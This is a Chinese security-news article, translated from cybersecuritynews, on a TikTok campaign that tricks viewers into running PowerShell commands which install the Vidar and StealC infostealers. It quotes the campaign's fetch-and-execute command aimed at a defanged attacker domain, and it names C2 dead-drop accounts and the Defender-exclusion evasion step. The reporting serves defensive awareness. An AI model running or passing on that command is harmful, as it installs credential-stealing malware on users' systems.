---
title: 黑客利用TikTok热门视频发布Vidar和StealC恶意软件
url: https://www.anquanke.com/post/id/307682
source: 安全客-有思想的安全新媒体
date: 2025-05-24
fetch_date: 2025-10-06T22:27:15.529055
---

# 黑客利用TikTok热门视频发布Vidar和StealC恶意软件

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 黑客利用TikTok热门视频发布Vidar和StealC恶意软件

阅读量**80142**

发布时间 : 2025-05-23 16:51:20

**x**

##### 译文声明

本文是翻译文章，文章原作者 图沙尔 苏布拉 杜塔，文章来源：cybersecuritynews

原文地址：<http://ldyqb1v.pachong.shyc2.qihoo.net/#/tasks/anquanke/>

译文仅供参考，具体内容表达以及含义原文为准。

在一项突出威胁行为者不断发展策略的发展中,网络犯罪分子已经开始利用TikTok的普及来分发复杂的信息窃取恶意软件。

这个新活动专门提供Vidar和StealC信息窃取者,欺骗用户以激活合法软件或解锁Windows OS,Microsoft Office,CapCut和Spotify等应用程序的高级功能为幌子执行恶意PowerShell命令。

与依赖受损网站或网络钓鱼电子邮件的传统恶意软件分发方法不同,这种攻击媒介完全通过视频内容利用社交工程。

威胁行为者创建不露面的视频 – 可能使用AI工具生成 – 为用户提供一步一步的指令,以无意中在自己的系统上安装恶意软件。

这种方法特别阴险,因为它在平台上没有留下恶意代码,用于检测安全解决方案,所有可操作的内容都在视觉和听觉上提供。

Trend identifiedMicro研究人员确定了参与此活动的多个TikTok账户,包括@gitallowed,@zane.houghton,@allaivo2,@sysglow.wow,@alexfixpc和@digitaldreams771。

他们的调查显示,一些视频获得了显着的牵引力,其中一个特定视频吸引了超过20,000个喜欢,100条评论,并达到了约50万次观看。

这种广泛的曝光证明了该活动的潜在影响,并突出了TikTok的算法覆盖范围如何放大恶意内容。

对受害者的后果是严重的,因为这些信息窃取者可以窃取敏感数据,窃取凭据并可能损害业务系统。

安装后,恶意软件会与命令和控制服务器建立通信,使攻击者能够从受损设备中获取有价值的信息。

这对个人用户和组织都构成重大威胁,因为被盗的凭据可能导致账户接管、财务欺诈和进一步的网络渗透。

### **感染机制与技术分析**

感染链从用户按照视频指令打开PowerShell(通过按Windows + R并键入“powershell”)然后执行类似于:-的命令时开始。

```
iex (irm https://allaivo[.]me/spotify)
```

这个看似无害的命令下载并执行一个远程脚本(SHA256: b8d9821a478f1a37070867eb2038c464cc59ed31a4c7413ff768f2e14d3886),启动感染过程。

执行后,脚本在用户的APPDATA和LOCALAPPDATA文件夹中创建隐藏目录,然后将这些位置添加到Windows Defender排除列表中 – 一种复杂的规避技术,可帮助恶意软件避免检测。

然后,恶意软件继续下载其他有效载荷,包括Vidar和StealC信息窃取器。这些恶意软件变体特别危险,因为它们针对敏感信息,包括保存的密码[,](https://cybersecuritynews.com/cryptocore-cryptocurrency-scam-draining-wallets/)加密货币钱包和身份验证cookie。安装后[,](https://cybersecuritynews.com/malware-analysis/)恶意软件连接到各种命令和控制服务器,包括滥用的合法服务。

例如,Vidar使用Steam配置文件(hxxps://steamcommunity[.]com/profiles/76561199846773220)和Telegram频道(hxxps://t[.]me/v00rd)作为“Dead Drop Resolvers”来隐藏其实际的C&C基础设施 – 一种使跟踪和中断更具挑战性的技术。使这场运动特别有效的是它如何将社会工程与技术开发相结合。通过作为访问流行软件高级功能的有用教程,视频与观众建立信任,然后观众愿意执行损害其系统的命令。这代表了基于社交媒体的攻击的重大演变,表明威胁行为者如何继续调整其策略以利用用户行为并逃避传统的安全控制。

这场运动展示了社会工程攻击的演变性质,以及需要提高社交媒体内容的安全意识。

用户应该对未经请求的技术指令保持健康的怀疑态度,特别是那些涉及PowerShell命令的指令,无论来源可能看起来多么合法或有帮助。

本文翻译自cybersecuritynews [原文链接](http://ldyqb1v.pachong.shyc2.qihoo.net/#/tasks/anquanke/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/307682](/post/id/307682)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](http://ldyqb1v.pachong.shyc2.qihoo.net/#/tasks/anquanke/)

如若转载,请注明出处： <http://ldyqb1v.pachong.shyc2.qihoo.net/#/tasks/anquanke/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**2赞

收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p2.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=170061)

[安全客](/member.html?memberId=170061)

这个人太懒了，签名都懒得写一个

* 文章
* **2096**

* 粉丝
* **6**

### TA的文章

* ##### [英国通过数据访问和使用监管法案](/post/id/308719)

  2025-06-20 17:11:10
* ##### [CISA警告：严重缺陷（CVE-2025-5310）暴露加油站设备](/post/id/308715)

  2025-06-20 17:09:03
* ##### [大多数公司高估了AI治理，因为隐私风险激增](/post/id/308708)

  2025-06-20 17:05:02
* ##### [研究人员发现了有史以来最大的数据泄露事件，暴露了160亿个登录凭证](/post/id/308704)

  2025-06-20 17:02:15
* ##### [CVE-2025-6018和CVE-2025-6019漏洞利用：链接本地特权升级缺陷让攻击者获得大多数Linux发行版的根访问权限](/post/id/308701)

  2025-06-20 16:59:36

### 相关文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)